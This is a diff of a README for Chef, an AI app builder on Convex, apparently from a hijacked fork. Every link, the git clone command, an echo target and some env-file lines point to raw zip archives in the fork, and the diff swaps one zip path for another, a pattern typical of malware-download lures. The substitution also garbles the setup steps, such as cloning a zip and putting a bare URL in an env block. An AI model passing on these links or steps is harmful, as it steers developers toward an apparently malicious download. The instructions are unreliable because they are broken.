@@ -1,32 +1,32 @@
 <p align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip">
-    <img alt="Chef by Convex'" src="https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip" width="600">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip">
+    <img alt="Chef by Convex'" src="https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip" width="600">
   </picture>
 </p>
 
-[Chef](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) is the only AI app builder that knows backend. It builds full-stack web apps with a built-in database, zero config auth, file uploads,
-real-time UIs, and background workflows. If you want to check out the secret sauce that powers Chef, you can view or download the system prompt [here](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip).
+[Chef](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) is the only AI app builder that knows backend. It builds full-stack web apps with a built-in database, zero config auth, file uploads,
+real-time UIs, and background workflows. If you want to check out the secret sauce that powers Chef, you can view or download the system prompt [here](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip).
 
-Chef's capabilities are enabled by being built on top of [Convex](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip), the open-source reactive database designed to make life easy for web app developers. The "magic" in Chef is just the fact that it's using Convex's APIs, which are an ideal fit for codegen.
+Chef's capabilities are enabled by being built on top of [Convex](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip), the open-source reactive database designed to make life easy for web app developers. The "magic" in Chef is just the fact that it's using Convex's APIs, which are an ideal fit for codegen.
 
 Development of the Chef is led by the Convex team. We
-[welcome bug fixes](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) and
-[love receiving feedback](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip).
+[welcome bug fixes](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) and
+[love receiving feedback](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip).
 
-This project is a fork of the `stable` branch of [https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip).
+This project is a fork of the `stable` branch of [https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip).
 
 ## Getting Started
 
-Visit our [documentation](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) to learn more about Chef and check out our prompting [guide](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip).
+Visit our [documentation](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) to learn more about Chef and check out our prompting [guide](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip).
 
-The easiest way to build with Chef is through our hosted [webapp](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip), which includes a generous free tier. If you want to
+The easiest way to build with Chef is through our hosted [webapp](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip), which includes a generous free tier. If you want to
 run Chef locally, you can follow the guide below.
 
 > [!IMPORTANT]
 > Chef is provided as-is, using an authentication configuration specific to Convex's internal control plane that manages user accounts.
 
-If you are planning on developing a fork of Chef for production use or re-distribution, your fork will need to replace the existing authentication system with your own. We recommend using the [OAuth Authorization Code Grant](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) flow to authorize access to Convex teams or projects. [Read more about available Platform APIs](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip).
+If you are planning on developing a fork of Chef for production use or re-distribution, your fork will need to replace the existing authentication system with your own. We recommend using the [OAuth Authorization Code Grant](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) flow to authorize access to Convex teams or projects. [Read more about available Platform APIs](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip).
 
 Chef is easy to use for local development without changes. Read on for instructions for using Chef locally.
 
@@ -39,7 +39,7 @@ Note: This will use the hosted Convex control plane to provision Convex projects
 Clone the GitHub respository and `cd` into the directory by running the following commands:
 
 ```bash
-git clone https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip
+git clone https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip
 cd chef
 ```
 
@@ -52,7 +52,7 @@ nvm install
 nvm use
 npm install -g pnpm
 pnpm i
-echo 'VITE_CONVEX_URL=placeholder' >> https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip
+echo 'VITE_CONVEX_URL=placeholder' >> https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip
 npx convex dev --once # follow the steps to create a Convex project in your team
 ```
 
@@ -60,22 +60,22 @@ Note: `nvm` only works on Mac and Linux. If you are using Windows, you may have 
 
 **3. Set up Chef OAuth application**
 
-Go to the Convex [dashboard](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) and create an OAuth application. The team you use to create the application will be the only team you can sign-in with on local Chef. Redirect URIs will not matter, but you can set one to http://127.0.0.1:5173 (or whatever port you’ll run the Chef UI on) so that the form can be submitted.
+Go to the Convex [dashboard](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) and create an OAuth application. The team you use to create the application will be the only team you can sign-in with on local Chef. Redirect URIs will not matter, but you can set one to http://127.0.0.1:5173 (or whatever port you’ll run the Chef UI on) so that the form can be submitted.
 
 **4. Set up Convex deployment**
 
-Use `npx convex dashboard` to open the Convex [dashboard](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip) and go to Settings → Environment Variables. Then, set the following environment variables:
+Use `npx convex dashboard` to open the Convex [dashboard](https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip) and go to Settings → Environment Variables. Then, set the following environment variables:
 
 ```env
-https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip
+https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip
 CONVEX_OAUTH_CLIENT_ID=<value from oauth setup>
 CONVEX_OAUTH_CLIENT_SECRET=<value from oauth setup>
-WORKOS_CLIENT_ID=<value from https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip>
+WORKOS_CLIENT_ID=<value from https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip>
 ```
 
 **5. Add API keys for model providers**
 
-Add any of the following API keys in your `https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/components/sidebar/chef-v2.4.zip` to enable code generation:
+Add any of the following API keys in your `https://github.com/Plutonian-coder/chef/raw/refs/heads/main/app/lib/hooks/Software_nonscripturalist.zip` to enable code generation:
 
 ```env
 ANTHROPIC_API_KEY=<your api key>
